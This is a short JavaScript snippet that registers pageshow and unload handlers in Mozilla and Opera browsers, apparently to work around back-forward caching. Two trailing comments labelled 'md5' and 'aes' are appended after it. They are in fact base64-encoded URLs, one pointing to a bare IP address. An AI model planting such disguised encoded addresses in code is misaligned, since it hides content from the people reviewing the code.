if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cucXVvcmEuY29tL3RvcGljL0xvdmUvdG9wX3F1ZXN0aW9ucw==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/